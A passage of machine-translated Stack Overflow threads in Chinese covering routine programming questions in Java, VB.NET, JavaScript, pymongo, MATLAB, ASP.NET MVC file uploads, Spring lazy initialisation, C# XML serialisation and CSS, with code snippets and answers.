你可以看看NIO。您可以使用低级别`ByteBuffer`来跟踪偏移量并将其包装在 a`CharBuffer`中以将输入转换为行。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2018-04-15T11:16:13.490

这是应该起作用的东西。它假定为 UTF-8，但您可以轻松更改它。

```
import java.io.*;

class main {
    public static void main(final String[] args) throws Exception {
        ByteCountingLineReader r = new ByteCountingLineReader(new ByteArrayInputStream(toUtf8("Hello\r\nWorld\n")));

        String line = null;
        do {
            long count = r.byteCount();
            line = r.readLine();
            System.out.println("Line at byte " + count + ": " + line);
        } while (line != null);

        r.close();
    }

    static class ByteCountingLineReader implements Closeable {
        InputStream in;
        long _byteCount;
        int bufferedByte = -1;
        boolean ended;

        // in should be a buffered stream!
        ByteCountingLineReader(InputStream in) {
            this.in = in;
        }

        ByteCountingLineReader(File f) throws IOException {
            in = new BufferedInputStream(new FileInputStream(f), 65536);
        }

        String readLine() throws IOException {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            if (ended) return null;
            while (true) {
                int c = read();
                if (ended && baos.size() == 0) return null;
                if (ended || c == '\n') break;
                if (c == '\r') {
                    c = read();
                    if (c != '\n' && !ended)
                        bufferedByte = c;
                    break;
                }
                baos.write(c);
            }
            return fromUtf8(baos.toByteArray());
        }

        int read() throws IOException {
            if (bufferedByte >= 0) {
                int b = bufferedByte;
                bufferedByte = -1;
                return b;
            }
            int c = in.read();
            if (c < 0) ended = true; else ++_byteCount;
            return c;
        }

        long byteCount() {
            return bufferedByte >= 0 ? _byteCount - 1 : _byteCount;
        }

        public void close() throws IOException {
            if (in != null) try {
                in.close();
            } finally {
                in = null;
            }
        }

        boolean ended() {
            return ended;
        }
    }

    static byte[] toUtf8(String s) {
        try {
            return s.getBytes("UTF-8");
        } catch (Exception __e) {
            throw rethrow(__e);
        }
    }

    static String fromUtf8(byte[] bytes) {
        try {
            return new String(bytes, "UTF-8");
        } catch (Exception __e) {
            throw rethrow(__e);
        }
    }

    static RuntimeException rethrow(Throwable t) {

        throw t instanceof RuntimeException ? (RuntimeException) t : new RuntimeException(t);
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-01-02T14:18:31.357

尝试使用`RandomAccessFile`

```
 RandomAccessFile raf = new RandomAccessFile(filePath, "r");
     while ((cur_line = raf.readLine()) != null){
        System.out.println(curr_line);
        // get offset
        long rowIndex = raf.getFilePointer();
     } 
```

通过偏移量寻找：

`raf.seek(offset);`

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2017-05-23T02:11:22.693

我想知道您的最终解决方案，但是，我认为使用 long 类型而不是 int 可以满足上述代码中的大多数情况。

* * *

## 回答 #5

> 赞同：-3
> 
> 时间：2013-02-26T15:30:38.767

如果您想逐行读取文件，我会推荐以下代码：

```
import java.io.*;
class FileRead 
{
 public static void main(String args[])
  {
  try{
  // Open the file that is the first 
  // command line parameter
  FileInputStream fstream = new FileInputStream("textfile.txt");
  // Use DataInputStream to read binary NOT text.
  BufferedReader br = new BufferedReader(new InputStreamReader(fstream));
  String strLine;
  //Read File Line By Line
  while ((strLine = br.readLine()) != null)   {
  // Print the content on the console
  System.out.println (strLine);
  }
  //Close the input stream
  in.close();
    }catch (Exception e){//Catch exception if any
  System.err.println("Error: " + e.getMessage());
  }
  }
} 
```

我过去一直使用这种方法，效果很好！

来源：[这里](http://www.roseindia.net/java/beginners/java-read-file-line-by-line.shtml)

# .net - 树形视图 用于 win 表单应用程序的图像位置

> ID：15092874
> 
> 赞同：1
> 
> 时间：2013-02-26T15:26:08.163
> 
> 标签：.net, vb.net, winforms

我在树视图中显示节点的图像，如下所示，为了使这项工作，在运行时我必须将图像文件保存在应用程序文件夹中以应对以下情况，有没有办法将图像保存在类似于大会的 GAC？

```
 Dim myImageList As ImageList = New ImageList()
    myImageList.Images.Add(Image.FromFile("Tick.png"))
    TreeView1.ImageList = myImageList
    TreeView1.ImageIndex = 0 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-26T16:00:10.523

如果您的图像是静态的并且在部署后不会更改，您可以轻松地将它们放入资源文件中。通过这种方式，图像被嵌入到程序集中，并且很容易与应用程序一起部署（无需任何额外的努力）。

添加资源文件的步骤如下：

在**解决方案资源管理器**窗口中，右键单击项目并选择**Add->New Item**。从显示的模板中选择**资源文件**并为其命名（`MyResources`例如）。单击资源窗口上方的**Add Resource**菜单附近的小箭头，然后选择**Add Existing File**。然后选择您的图像文件。

您可以使用`My.Resources.MyResources.Tick`（`Tick`只是一个示例图像文件）访问代码中的图像。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T15:50:34.680

将其添加到资源中解决了我的问题。

```
 Dim img As Image = CType(My.Resources.ResourceManager.GetObject("Tick.png"), Image)
    myImageList.Images.Add(img) 
```

# javascript - 嵌套 div 中的 Ajax 调用不适用于带有 MVC3 的 FireFox

> ID：15092880
> 
> 赞同：1
> 
> 时间：2013-02-26T15:26:15.180
> 
> 标签：javascript, ajax, asp.net-mvc-3, firefox

我有一个带有链接的 cshtml 页面和一个显示一些内容的 div。

```
<a href="#" onclick="Show_New_Page('#First_Div')>My Link</a>

<div id="First_Div">
    @Html.Partial("General_Page") <- This is the default page that gets displayed on load.
</div> 
```

当您单击该链接时，将调用 JavaScript 函数 Show_New_Page 并将字符串“#First_Div”作为参数传递。我通过我希望 Show_New_Page 中的 ajax 的 div 的名称来放置其成功值。该函数如下所示：

```
function Show_New_Page(div) {
    $.ajax(
    {
        type: "POST",
        url: url, //Declared above globally, unimportant
        data: data, //Declared above globally, unimportant
        success: function (result) {
            $(div).html(result);
        }
    });
} 
```

当您在 Internet Explorer 中单击此链接时，新页面会正常显示，没有任何问题。但是，当您在 FireFox 中单击此链接时，整个页面将变为白色，并且无法成功加载。

有很多关于 Ajax 和不同浏览器问题的帖子，但我找不到对我有帮助的帖子。非常感谢我可以尝试的任何提示或技巧。我非常不确定为什么会发生这种情况，所以如果我遗漏了任何信息，我一定会尽力提供。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:29:47.587

调用函数`)`时似乎缺少关闭。`Show_New_Page`此外，建议从单击处理程序返回 false 以取消默认操作：

```
<a href="#" onclick="Show_New_Page('#First_Div'); return false;">My Link</a> 
```

此外，您可能更愿意给这个锚点一个 id：

```
<a href="#" id="myLink" data-id="#First_Div">My Link</a> 
```

然后在一个单独的文件中不显眼地 AJAXify 以避免将标记与 javascript 混合：

```
$(function() {
    $('#myLink').click(function() {
        $.ajax({
            type: 'POST',
            url: url, //Declared above globally, unimportant
            data: data, //Declared above globally, unimportant
            context: { id: $(this).data('id') },
            success: function (result) {
                $(this.id).html(result);
            }
        });
        return false;
    });
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-28T14:50:42.500

这里的问题是，我在单击链接后传递的 ajax 视图正在使用 document.write() 语句。我了解到在页面已经加载后这样做很奇怪。我已将这些语句移至未使用 ajax 加载的文件中，从而解决了问题。感谢所有给我评论和建议的人。正是对这些想法的调查将我引向了核心问题！

**教训：小心 firefox 中过多的 document.write() 语句！**

# mongodb - 如何在 pymongo 中返回一个 mongodb 对象数组（没有游标）？MapReduce 可以做到这一点吗？

> ID：15092884
> 
> 赞同：13
> 
> 时间：2013-02-26T15:26:27.153
> 
> 标签：mongodb, pymongo

我在 mongo 中设置了一个数据库，我正在使用 pymongo 访问它。

我希望能够将一小组字段提取到字典列表中。所以，就像我在输入时在 mongo shell 中得到的东西......

```
db.find({},{"variable1_of_interest":1, "variable2_of_interest":1}).limit(2).pretty() 
```

我想要一个 python 语句，如：

```
x = db.find({},{"variable1_of_interest":1, "variable2_of_interest":1}) 
```

其中 x 是某种数组结构而不是游标——也就是说，不是迭代，例如：

```
data = []
x = db.find({},{"variable1_of_interest":1, "variable2_of_interest":1})
for i in x:
    data.append(x) 
```

是否有可能我可以使用 MapReduce 将其带入单线？就像是

```
db.find({},{"variable1_of_interest":1, "variable2_of_interest":1}).map_reduce(mapper, reducer, "data") 
```

我打算将此数据集输出到 R 进行一些分析，但我想将 IO 集中在 Python 中。

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2013-03-01T12:24:14.443

您不需要调用 mapReduce，只需将光标变成一个列表，如下所示：

```
>>> data = list(col.find({},{"a":1,"b":1,"_id":0}).limit(2))
>>> data
[{u'a': 1.0, u'b': 2.0}, {u'a': 2.0, u'b': 3.0}] 
```

其中 col 是您的 db.collection 对象。

但是要小心大/巨大的结果，因为每件事都会被加载到内存中。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-26T15:56:41.110

您可以做的是在 pymongo 中调用 mapReduce 并将 find 查询作为参数传递给它，它可能是这样的：

```
db.yourcollection.Map_reduce(map_function, reduce_function,query='{}') 
```

关于预测，我认为您需要在 reduce 函数中执行它们，因为查询仅指定选择标准，如[mongo 文档中所述](http://docs.mongodb.org/manual/reference/method/db.collection.mapReduce/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-12-27T01:21:33.677

基于 Asya 的回答：如果您想要每个条目中只有一个值的列表而不是对象列表 - 使用列表推导对我有用。

即如果每个对象代表一个用户并且数据库存储了他们的`email`，而你说想要所有 15 岁的用户

`user_emails = [user['email'] for user in db.people.find( {'age' : 15} )]`

[更多在这里](https://stackoverflow.com/questions/7271482/python-getting-a-list-of-value-from-list-of-dict?noredirect=1&lq=1)

# reporting - 如何设置 Microsoft Reporting 矩阵的行和列标签？

> ID：15092885
> 
> 赞同：0
> 
> 时间：2013-02-26T15:26:27.053
> 
> 标签：reporting, rdlc

我的报告上有一个简单的矩阵控件，除了没有标签之外，数据的显示方式与我预期的一样。

如何让标签显示我想要的值（不一定是数据元素的名称）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T04:38:02.563

我发现通过突出显示累积数据的单元格，可以右键单击并选择“插入静态行”或“插入静态列”。

一旦创建了静态行或列，就可以将其用作标签。

# matlab - 使用datenum在matlab中将单元格转换为日期？

> ID：15092887
> 
> 赞同：0
> 
> 时间：2013-02-26T15:26:33.473
> 
> 标签：matlab, date, type-conversion

我有一个包含单元格结构中日期的矩阵。我设法使用 datenum() 转换日期（第 2 列），但我不确定如何添加时间（第 3 列）

数据如下所示：

```
 'IBM' 20090602    0   108.410000000000
  'IBM' 20090602    500 108.560000000000 
```

我的代码：

```
date = datenum(num2str(IBM(:,2)),'yyyymmdd') 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:33:45.280

让我们先回顾一下你的错误：

1.  你`datenum`用字符串`'IBM(:, 2)'`而不是实际的数组来提供。丢弃引号。
2.  `datenum`接受字符串，而不是数值。

一种可能的解决方案是将数据的第二列转换为字符串数组，并将其输入`datenum`，如下所示：

```
d = datenum(num2str(vertcat(IBM{:, 2})), 'yyyymmdd'); 
```

请注意，当然，这**只有**在每一行中日期字符串的格式是固定的情况下才有可能。

**编辑：**
要将第三列中的值添加到 的结果中`datenum`，只需执行以下操作：

```
d + vertcat(IBM{:, 3}) 
```

where`d`是从中获得的日期值的列向量`datenum`（我假设您想做基本的加法，因为您没有在第三列中指定 timje 值的实际含义）。

在一行中，完整的答案如下所示：

```
datenum(num2str(vertcat(IBM{:, 2})), 'yyyymmdd') + vertcat(IBM{:, 3}) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T16:19:35.733

您可以在转换为 datenum 时直接添加时间值。只需从我假设的分钟（如果它们以秒为单位，将另一个 *60 添加到除数）转换为天，这是 MATLAB 用于其 datenum 计算的。

```
timestamps = cellfun(@(x,y) datenum(num2str(x),'yyyymmdd')+y/(24*60),...
IBM(:,2),...
IBM(:,3),...
'UniformOutput',false) 
```

# c# - 使用asp.net mvc 3将文件上传到文件夹时访问被拒绝？

> ID：15092893
> 
> 赞同：1
> 
> 时间：2013-02-26T15:26:39.730
> 
> 标签：c#, asp.net, asp.net-mvc, asp.net-mvc-3, file-upload

我目前正在学习asp.net mvc 3，现在我正在尝试实现一个用户可以将文件上传到文件夹的应用程序：

这是我拥有的第一个实现，它实际上工作正常，这是控制器代码：

```
 public class FileUploadController : Controller
    {
        //
        // GET: /FileUpload/

        public ActionResult Index()
        {
            return View();
        }
        [HttpPost]
        [ActionName("Upload")]
        public ActionResult Index(FormCollection form)
        {

            string upFolder = Server.MapPath("~/FileUploadFiles/");

            if(!Directory.Exists(upFolder))
            {
                Directory.CreateDirectory(upFolder);
            }
            HttpPostedFileBase photo = Request.Files["fileupload"];

            if (photo != null)
            {
                photo.SaveAs(upFolder+photo.FileName);
                return RedirectToAction("Index");
            }

            return View();
        }

    } 
```

这是我的另一个实现，我收到错误“访问路径'UserUploads\Uploads\'被拒绝。” 这是处理上传的实用程序类：

```
 public static class FileUploader
    {
        public static char DirSeparator = Path.DirectorySeparatorChar;
        public static string FilesPath = "UserUploads" + DirSeparator + "Uploads" + DirSeparator;

        public static string UploadFile(HttpPostedFileBase file)
        {
            //check if we have a file
            if(file == null)
            {
                return "";
            }

            //make sure the file has content
            if(!(file.ContentLength > 0 ))
            {
                return "";
            }

            string fileName = file.FileName;
            string fileExt = Path.GetExtension(file.FileName);

            //make sure we are able to determine a proper extension
            if(fileExt == null)
            {
                return "";
            }

            //check if directory does not exists
            if(!Directory.Exists(FilesPath))
            {
                Directory.CreateDirectory(FilesPath);
            }

            //set our full path for saving
            string path = FilesPath + DirSeparator + fileName;
            //Save the file
            file.SaveAs(Path.GetFullPath(path));

            //Return the filename
            return fileName;

        }

        public static void DeleteFile(string fileName)
        {
            //Don't do anything if there is no name
            if(fileName.Length > 0)
            {
                return;
            }

            //Set our full path for deleting
            string path = FilesPath + DirSeparator + fileName;

            //Check if our file exists
            if(File.Exists(Path.GetFullPath(path)))
            {
                File.Delete(Path.GetFullPath(path));
            }
        } 
```

这是控制器的代码：

```
using MvcFileUpload.Utility;

namespace MvcFileUpload.Controllers
{
    public class UploadFilesController : Controller
    {
        //
        // GET: /UploadFiles/

        public ActionResult Index()
        {
            return View();
        }

        [HttpPost]
        [ActionName("Upload")]
        public ActionResult Index(HttpPostedFileBase file)
        {

            FileUploader.UploadFile(file);
            return RedirectToAction("Index");
        }

    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-26T15:31:50.787

`FilePath`应该在哪里创建目录？在网站根文件夹内？您应该手动创建“UserUploads”文件夹，并为 AppPool（包括您的 Web 应用程序）运行的帐户提供写入权限。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-26T15:37:49.497

路径可能不正确吗？我注意到在有效的实现中，您使用 Server.MapPath() 为目录使用完整的物理路径，但实用程序类只有部分路径。如果您尝试为 FilesPath 变量分配完整路径会发生什么？如果您仍然遇到问题，我建议您运行[ProcMon](http://technet.microsoft.com/en-us/sysinternals/bb896645.aspx)以获取有关在生成拒绝访问错误时文件系统上发生的情况的更多信息。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-12-05T18:49:23.643

没有一个解决方案对我有帮助。我正在考虑将用户分配给具有目录访问权限的 IIS。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-26T16:29:56.737

I was able to solve it by

by modifying the utility class:

```
 public static string FilesPath = HttpContext.Current.Server.MapPath("~\\UserUploads" + DirSeparator + "Uploads" + DirSeparator); 
```

Thank you Sir/Ma'am for providing solutions. Thank you++

# spring - 惰性初始化的 Spring 默认行为

> ID：15092898
> 
> 赞同：59
> 
> 时间：2013-02-26T15:26:58.867
> 
> 标签：spring, spring-ioc

我是spring的初学者，ESP控制反转。我很困惑理解以下之间的区别

```
 <bean id="demo" class="Demo" lazy-init="false"/>
 <bean id="demo" class="Demo" lazy-init="true"/>
 <bean id="demo" class="Demo" lazy-init="default"/> 
```

据我了解：lazy-init=false 在启动时创建 bean，而 lazy-init=true 不在启动时创建 bean，而是根据对特定 bean 的请求创建 bean。在这里纠正我，如果我的解释是错误的。

惰性初始化的默认行为到底是什么？它将如何实例化？

* * *

## 回答 #1

> 赞同：74
> 
> 时间：2013-02-26T15:30:15.693

默认行为是假的：

> 默认情况下，作为初始化过程的一部分，ApplicationContext 实现会急切地创建和配置所有单例 bean。通常，这种预实例化是可取的，因为配置或周围环境中的错误会立即发现，而不是几小时甚至几天之后。当这种行为不可取时，您可以通过将 bean 定义标记为惰性初始化来防止单例 bean 的预实例化。延迟初始化的 bean 告诉 IoC 容器在第一次被请求时创建一个 bean 实例，而不是在启动时。

[我建议阅读](https://docs.spring.io/spring/docs/current/spring-framework-reference/core.html#beans-factory-lazy-init)

* * *

## 回答 #2

> 赞同：26
> 
> 时间：2016-02-02T05:21:14.823

对于那些来到这里并使用 Java 配置的人，您可以使用如下注释将 Bean 设置为惰性初始化：

**在配置类中：**

```
@Configuration
// @Lazy - For all Beans to load lazily
public class AppConf {

    @Bean
    @Lazy
    public Demo demo() {
        return new Demo();
    }
} 
```

**对于组件扫描和自动接线：**

```
@Component
@Lazy
public class Demo {
    ....
    ....
}

@Component
public class B {

    @Autowired
    @Lazy // If this is not here, Demo will still get eagerly instantiated to satisfy this request.
    private Demo demo;

    .......
 } 
```

* * *

## 回答 #3

> 赞同：22
> 
> 时间：2013-02-26T15:29:38.947

**bean**上的`lazy-init="default"`设置仅指封闭**beans**元素的属性设置的内容。的隐含默认值为。**`default-lazy-init`**`default-lazy-init``false`****

 ****如果 bean 上没有`lazy-init`指定属性，它总是被急切地实例化。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2015-08-19T08:49:51.307

lazy-init 是 bean 的属性。lazy-init 的值可以是 true 和 false。**如果lazy-init 为true**，那么当对bean 发出请求时，该bean 将被初始化。这个bean在spring容器初始化的时候不会被初始化， **如果lazy-init为false**那么bean会在spring容器初始化的时候被初始化。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2016-07-13T13:31:07.117

当我们在 element 中使用**lazy-init="default"**作为属性时，容器会获取元素的**default-lazy-init="true|false"**属性指定的值，并将其用作lazy-init="true|false ”。

如果元素中不存在 default-lazy-init 属性，则元素中的lazy-init="default" 将表现得如同lazy-init-"false"。****

# c# - XML 反序列化跳过元素

> ID：15092899
> 
> 赞同：1
> 
> 时间：2013-02-26T15:27:03.287
> 
> 标签：c#, xml, serialization

我有这个 XML 结构（来自一个更大的文件——只有这部分会出现问题）

```
<Table>
    <Row id="1">
        <Heading>sgjsfgjsgfh443q572q356</Heading>
        <Items>
            <Item car="motor1" id="1">
                <BodyText color="red">130*</BodyText>
                <Subscript>3</Subscript>
            </Item>
        </Items>
    </Row>
</Table> 
```

并尝试使用`XmlSerializer`此模型将其反序列化（对于与 XML 匹配的部分也是 excert）：

```
[XmlRoot("Table")]
public partial class Table
{
    [XmlElement("Row")]
    public Row[] Row { get; set; }
}

[XmlRoot("Row")]
public partial class Row
{
    [XmlElement("Heading")]
    public string Heading { get; set; }

    [XmlElement("Items")]
    public Item[] Items { get; set; }

    [XmlElement("BodyText")]
    public BodyText BodyText { get; set; }

    [XmlAttribute("id")]
    public string id { get; set; }
}

[XmlRoot("Items")]
public partial class Items
{
    [XmlElement("Item")]
    public Item[] Item { get; set; }
}

[XmlRoot("Item")]
public partial class Item
{
    [XmlElement("BodyText")]
    public BodyText BodyText { get; set; }

    [XmlElement("PhoneNumber")]
    public PhoneNr[] PhoneNr { get; set; }

    [XmlElement("Subscript")]
    public Subscript[] Subscript { get; set; }

    [XmlAttribute("car")]
    public string car { get; set; }

    [XmlAttribute("id")]
    public string id { get; set; }
}

[XmlRoot("BodyText")]
public partial class BodyText
{
    [XmlAttribute("color")]
    public string color { get; set; }

    [XmlAttribute("fonttype")]
    public string fonttype { get; set; }

    [XmlAttribute("fontsize")]
    public string fontsize { get; set; }

    [XmlAttribute("fontweight")]
    public string fontweight { get; set; }

    [XmlText]
    public string Value { get; set; }
}

[XmlRoot("Subscript")]
public partial class Subscript
{
    [XmlAttribute("for")]
    public string @for { get; set; }

    [XmlText]
    public string Value { get; set; }
}

[XmlRoot("PhoneNr")]
public partial class PhoneNr
{
    [XmlElement("Display")]
    public string Display { get; set; }

    [XmlElement("Number")]
    public string Number { get; set; }

    [XmlAttribute("id")]
    public string id { get; set; }
} 
```

类的结果对象`Table`包含一个`Row`元素，这很好，但是：里面的元素`Row`都是空的。似乎序列化程序无法与`Items`他们的类匹配。

我能做什么，所以`Items`and`Item`被正确反序列化为对象？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T16:34:23.183

您能否为 Subscript、PhoneNr 和 BodyText 添加您的 XmlRoot？这样我可以做一些更好的测试。

我还建议：创建对象图并将其序列化。这样你就可以看到它是如何被序列化的。

编辑：这是我从我创建的对象反序列化的 XML。如您所见，项目嵌套不正确，所以我想这也是序列化时的问题。我会随时通知你

```
<?xml version="1.0" encoding="utf-8"?>
<Table xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Row>
    <Heading>myHeading</Heading>
    <Items car="myCar" id="myId">
      <BodyText color="Red">135</BodyText>
      <Subscript>3</Subscript>
    </Items>
    <Items car="myCar" id="myId">
      <BodyText color="Red">135</BodyText>
      <Subscript>3</Subscript>
    </Items>
  </Row>
</Table> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-26T17:31:02.600

我发现了我认为的错误。在您的类 Row 中，Property Items 应该是 Type Items 而不是 Item[]。

当我进行此更改时，我可以进行适当的序列化和反序列化。

这是序列化和反序列化代码+我使用的类。

```
private void button1_Click(object sender, EventArgs e)
{
    //Serialize
    //var x = File.ReadAllText(@"C:\TableInfo.xml");
    //var stringReader = new StringReader(x);
    //var deserializer = new XmlSerializer(typeof(Table));
    //var myTable = (Table)deserializer.Deserialize(stringReader);

    //Deserialize
    var myTable2 = new Table();
    myTable2.Row = new Row[1];
    myTable2.Row[0] = new Row();
    myTable2.Row[0].id = "myId";
    myTable2.Row[0].Heading = "myHeading";
    myTable2.Row[0].Items = new Items();
    myTable2.Row[0].Items.Item = new Item[1];
    myTable2.Row[0].Items.Item[0] = new Item();
    myTable2.Row[0].Items.Item[0].BodyText = new BodyText() { color = "Red" };
    myTable2.Row[0].Items.Item[0].BodyText.Value = "135";
    myTable2.Row[0].Items.Item[0].car = "myCar";
    myTable2.Row[0].Items.Item[0].id = "myId";
    myTable2.Row[0].Items.Item[0].Subscript = new Subscript[1];
    myTable2.Row[0].Items.Item[0].Subscript[0] = new Subscript();
    myTable2.Row[0].Items.Item[0].Subscript[0].Value = "3";

    XmlSerializer serializer = new XmlSerializer(typeof(Table));
    TextWriter textWriter = new StreamWriter(@"C:\TableInfo.xml");
    serializer.Serialize(textWriter, myTable2);
    textWriter.Close();
}

[XmlRoot("Table")]
public partial class Table
{
    [XmlElement("Row")]
    public Row[] Row { get; set; }
}

[XmlRoot("Row")]
public partial class Row
{
    [XmlElement("Heading")]
    public string Heading { get; set; }

    [XmlElement("Items")]
    public Items Items { get; set; }

    [XmlElement("BodyText")]
    public BodyText BodyText { get; set; }

    [XmlAttribute("id")]
    public string id { get; set; }
}

[XmlRoot("Items")]
public partial class Items
{
    [XmlElement("Item")]
    public Item[] Item { get; set; }
}

[XmlRoot("Item")]
public partial class Item
{
    [XmlElement("BodyText")]
    public BodyText BodyText { get; set; }

    [XmlElement("PhoneNumber")]
    public PhoneNr[] PhoneNr { get; set; }

    [XmlElement("Subscript")]
    public Subscript[] Subscript { get; set; }

    [XmlAttribute("car")]
    public string car { get; set; }

    [XmlAttribute("id")]
    public string id { get; set; }
}

[XmlRoot("BodyText")]
public partial class BodyText
{
    [XmlAttribute("color")]
    public string color { get; set; }

    [XmlAttribute("fonttype")]
    public string fonttype { get; set; }

    [XmlAttribute("fontsize")]
    public string fontsize { get; set; }

    [XmlAttribute("fontweight")]
    public string fontweight { get; set; }

    [XmlText]
    public string Value { get; set; }
}

[XmlRoot("Subscript")]
public partial class Subscript
{
    [XmlAttribute("for")]
    public string @for { get; set; }

    [XmlText]
    public string Value { get; set; }
}

[XmlRoot("PhoneNr")]
public partial class PhoneNr
{
    [XmlElement("Display")]
    public string Display { get; set; }

    [XmlElement("Number")]
    public string Number { get; set; }

    [XmlAttribute("id")]
    public string id { get; set; }
} 
```

# css - 如何防止选定选项卡的导航栏中出现斑点边框

> ID：15092904
> 
> 赞同：0
> 
> 时间：2013-02-26T15:27:22.863
> 
> 标签：css, twitter-bootstrap, border, navbar

我现在开始使用引导程序并且非常喜欢它，但现在出现了问题。

I made an adapted navbar and when a tab is selected, there is a spotted border that I dont like. 如何防止此边框（CSS）？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-26T15:33:24.100

你能添加一些代码吗？我认为在您的 CSS 中的某处您会发现类似的内容： 将`border: 1px dotted #ccc;`其更改为：`border: none;`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T15:30:23.117

根据您拥有的类/ID，它将类似于以下内容：

```
border:none; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-26T15:34:32.433

我将冒险并假设您的选项卡的 HTML 是 . 如果是这样，请确保在所有状态（CSS psuedo-classes）中明确定义所需的边框，特别是 :active

```
a:link {border-width:0;}     /* unvisited link */
a:visited {border-width:0;}  /* visited link */
a:hover {border-width:0;}    /* mouse over link */
a:active {border-width:0;}   /* selected link */ 
```

[http://www.w3schools.com/css/css_pseudo_classes.asp](http://www.w3schools.com/css/css_pseudo_classes.asp)

# facebook - 通过facebook授权。发生错误。请稍后再试

> ID：15092905
> 
> 赞同：1
> 
> 时间：2013-02-26T15:27:22.793
> 
> 标签：facebook, windows-phone-7

在我的应用程序中，我通过 facebook 授权，一切正常。但是现在我尝试通过FB登录并得到错误：发生错误。请稍后再试。我更新了我的 Facebook，但它没有帮助

这是我的代码

```
 private const string ExtendedPermissions = "user_about_me";
        private FacebookClient _fb = new FacebookClient();

 public MainPage()
        {
            InitializeComponent();           
            var parameters = new Dictionary<string, object>();
            parameters["client_id"] = FacebookSettings.AppID;
            parameters["redirect_uri"] = "https://www.facebook.com/connect/login_success.html";
            parameters["response_type"] = "token";
            parameters["display"] = "page";
            parameters["scope"] = ExtendedPermissions;
            Uri ur = _fb.GetLoginUrl(parameters);
            webBrowser1.Navigate(ur);

        }

 private void Browser_Navigated(object sender, System.Windows.Navigation.NavigationEventArgs l)
        {
            if (!_fb.TryParseOAuthCallbackUrl(e.Uri, out oauthResult))
            {
                return;
            }

            if (oauthResult.IsSuccess)
            {
                var accessToken = oauthResult.AccessToken;
                LoginSucceded(accessToken);
            }
            else
            {
                MessageBox.Show(oauthResult.ErrorDescription);

            } 

} 
```

# c# - 序列化 PropertyGrid (SerializeToXML) 失败

> ID：15092906
> 
> 赞同：1
> 
> 时间：2013-02-26T15:27:34.857
> 
> 标签：c#, xmlserializer, propertygrid

我尝试序列化 PropertyGrid 并将结果写入 XML 文件。最后，XML 文件几乎是空的；
XML 文件

```
<?xml version="1.0" encoding="utf-8"?>
<MyBookCollection xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" /> 
```

我的代码；

```
private void btnSave_Click(object sender, EventArgs e)
{
    MyBookCollection  MyBooks = new MyBookCollection ();

    SerializeToXML(MyBooks);
}

public void SerializeToXML(MyBookCollection MyBooks)
{
    XmlSerializer serializer = new XmlSerializer(typeof(MyBookCollection ));
    TextWriter textWriter = new StreamWriter(@"D:\BookInfo.xml");
    serializer.Serialize(textWriter, MyBooks);
    textWriter.Close();
}
}

[Serializable]
public class MyBookCollection 
{
     string m_Title;
     [Category("Book Titles")]
     [ReadOnly(true)]
     public string Title
     {
         get { return m_Title; }
         set { m_Caption = Title; }
     }
 } 
```

**出了什么问题或如何做得更好**
语言：C#

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:59:41.120

您是否尝试过以这种方式获取 .SelectedObject 属性？

```
private void btnSave_Click(object sender, EventArgs e)
{
    var MyBooks = myProertyGrid.SelectedObject as MyBookCollection;
    SerializeToXML(MyBooks);
} 
```

不幸的是，PropertyGrid 没有绑定属性更改。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T15:41:40.683

我看不出 XML 有什么问题。你的 XML 序列化没问题！

您只能看到 MyBookCollection 节点，因为对象中没有其他数据！

亲切的问候，维姆

# javascript - 从字符串路径动态更新 JavaScript 对象

> ID：15092912
> 
> 赞同：9
> 
> 时间：2013-02-26T15:27:54.860
> 
> 标签：javascript, object, path

我试图弄清楚是否可以使用字符串作为路径来更新 JavaScript 对象。

在下面的示例中，我试图弄清楚如何使用 `store>book>0>price`我的路径来更新第一本书的价格。

我知道我可以通过写作来访问它，`data['store']['book'][0]['price']`但我需要能够动态地做到这一点。我尝试了几件事，但没有运气。有任何想法吗？

***这需要适用于任何深度，而不是固定深度***

* * *

**数据：**

```
 var data = { 
      "store": {
        "book": [ 
          { "category": "reference",
            "author": "Nigel Rees",
            "title": "Sayings of the Century",
            "price": 8.95
          },
          { "category": "fiction",
            "author": "Evelyn Waugh",
            "title": "Sword of Honour",
            "price": 12.99
          }
        ],
        "bicycle": {
          "color": "red",
          "price": 19.95
        }
      }
    }
var path = "store>book>0>price" 
```

**功能：**

```
function updateObject(object, path, data) {
    var pathArray = path.split(">");
    // Some code here
} 
updateObject(data, path, "10.00"); 
```

* * *

**更新**

正如 felix 指出的那样，答案可以在这里找到。 [JavaScript 对象的动态深度设置](https://stackoverflow.com/questions/6842795/dynamic-deep-setting-for-a-javascript-object)

这是我的场景的一个工作示例 [http://jsfiddle.net/blowsie/Sq8j3/9/](http://jsfiddle.net/blowsie/Sq8j3/9/)

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2013-02-26T15:52:04.590

```
function updateObject(object, newValue, path){

